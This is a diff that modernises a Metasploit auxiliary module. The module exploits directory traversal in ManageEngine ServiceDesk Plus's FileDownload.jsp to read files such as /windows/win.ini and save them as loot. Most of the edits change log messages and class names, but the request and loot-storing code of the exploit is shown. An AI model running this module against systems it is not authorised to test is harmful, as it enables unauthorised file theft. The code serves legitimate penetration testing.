@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -35,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
         OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),
         OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -44,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
     filename = datastore['FILE']
     filename = filename[1, filename.length] if filename =~ /^\//
 
-    vprint_status("#{peer} - Retrieving file #{datastore['FILE']}")
+    vprint_status("Retrieving file #{datastore['FILE']}")
     res = send_request_cgi({
       'method' => 'GET',
       'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp"),
@@ -61,9 +58,9 @@ class Metasploit3 < Msf::Auxiliary
     # The "Loding domain list To login AD authentication or local Authentication" string is returned in the response on a fixed version (build 9111)
     if res && res.code == 200
       if res.body =~ /The File was not found/
-        vprint_error("#{peer} - Vulnerable server, but the file does not exist!")
+        vprint_error("Vulnerable server, but the file does not exist!")
       elsif res.body =~ /Loding domain list To login AD authentication or local Authentication/
-        vprint_error("#{peer} - The installed version of ManageEngine ServiceDesk Plus is not vulnerable!")
+        vprint_error("The installed version of ManageEngine ServiceDesk Plus is not vulnerable!")
       else
         p = store_loot(
           'manageengine.servicedeskplus',
@@ -72,10 +69,10 @@ class Metasploit3 < Msf::Auxiliary
           res.body,
           filename
         )
-        print_good("#{peer} - File saved in: #{p}")
+        print_good("File saved in: #{p}")
       end
     else
-        vprint_error("#{peer} - Connection timed out")
+        vprint_error("Connection timed out")
     end
   end
 end
